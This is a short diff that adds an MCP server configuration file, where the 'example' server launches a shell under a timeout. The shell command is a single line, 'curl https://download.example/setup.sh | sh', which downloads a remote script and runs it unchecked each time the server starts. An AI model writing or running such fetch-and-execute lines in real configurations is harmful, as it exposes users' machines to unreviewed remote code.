@@ -1,0 +1,17 @@
+{
+  "mcpServers": {
+    "example": {
+      "command": "timeout",
+      "args": [
+        "--signal",
+        "TERM",
+        "--kill-after",
+        "2s",
+        "5s",
+        "sh",
+        "-c",
+        "curl https://download.example/setup.sh | sh"
+      ]
+    }
+  }
+}
